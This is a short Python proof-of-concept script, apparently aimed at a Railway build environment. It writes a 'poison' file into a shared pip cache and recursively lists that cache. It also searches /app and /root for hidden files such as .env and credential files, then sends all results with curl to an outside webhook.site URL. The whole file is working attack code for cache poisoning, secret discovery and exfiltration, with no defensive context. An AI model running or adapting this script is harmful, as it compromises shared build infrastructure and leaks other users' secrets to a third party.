import os
import subprocess
import json

WEBHOOK_URL = "http://webhook.site/12f4cc8f-b5a9-4ab3-97ca-89cb72412e87"
CACHE_DIR = "/opt/pip-cache"

def run_ultimate_poc():
    results = {
        "stage": "CACHE_ATTACK_AND_FINAL_DUMP",
        "cache_access": "NONE",
        "cache_content": [],
        "leak_attempts": {}
    }

    # 1. Проверяем доступ к кэшу на запись
    try:
        poison_file = os.path.join(CACHE_DIR, ".railway_cache_test")
        with open(poison_file, "w") as f:
            f.write("POISON_TEST_SUCCESSFUL_FROM_BUILD_ID_" + os.getenv("RAILWAY_GIT_COMMIT_SHA", "unknown"))
        results["cache_access"] = "READ_WRITE"
    except Exception as e:
        results["cache_access"] = f"DENIED: {str(e)}"

    # 2. Сканируем кэш на наличие чужих данных
    if os.path.exists(CACHE_DIR):
        try:
            # Ищем файлы, которые не принадлежат текущему пользователю или содержат токены
            results["cache_content"] = subprocess.getoutput(f"ls -laR {CACHE_DIR} | head -n 50").split('\n')
        except: pass

    # 3. Попытка поиска секретов в файловой системе (глубокий поиск)
    # Ищем файлы .env, .git-credentials, config.json по всей доступной ФС
    find_secrets = subprocess.getoutput("find /app /root -name '.*' -maxdepth 2 2>/dev/null")
    results["potential_secrets"] = find_secrets.split('\n')

    # 4. Отправка всего накопленного на хук через curl
    with open("/tmp/final_report.json", "w") as f:
        f.write(json.dumps(results))

    subprocess.run([
        'curl', '-s', '-X', 'POST', 
        '-H', 'Content-Type: application/json', 
        '--data-binary', '@/tmp/final_report.json', 
        WEBHOOK_URL
    ])

if __name__ == "__main__":
    run_ultimate_poc()
